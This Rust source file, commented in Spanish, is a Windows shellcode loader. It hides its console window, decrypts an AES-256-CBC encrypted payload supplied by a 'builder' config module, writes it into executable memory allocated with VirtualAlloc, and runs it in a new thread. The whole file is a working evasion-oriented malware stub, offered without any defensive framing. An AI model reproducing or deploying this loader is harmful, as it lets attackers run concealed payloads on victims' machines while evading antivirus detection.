#![windows_subsystem = "windows"]

mod config; // <- acá importamos lo que genera el builder

use aes::Aes256;
use cbc::{cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit}, Decryptor};
use std::mem::transmute;
use std::ptr::copy;
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::shared::minwindef::DWORD;

type Aes256CbcDec = Decryptor<Aes256>;

fn decrypt_shellcode() -> Vec<u8> {
    let cipher = Aes256CbcDec::new_from_slices(config::KEY, config::IV).unwrap();
    let mut buffer = config::ENCRYPTED_SHELLCODE.to_vec();
    cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer).unwrap().to_vec()
}

fn main() {
    unsafe {
        let shellcode = decrypt_shellcode();

        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if mem.is_null() {
            return;
        }

        copy(shellcode.as_ptr(), mem.cast::<u8>(), shellcode.len()); // Esto copia el shellcode a la memoria asignada

        let func: extern "system" fn() -> DWORD = transmute(mem);
        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(transmute(func as *const ())),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        if !thread.is_null() {
            WaitForSingleObject(thread, INFINITE);
        }
    }
}
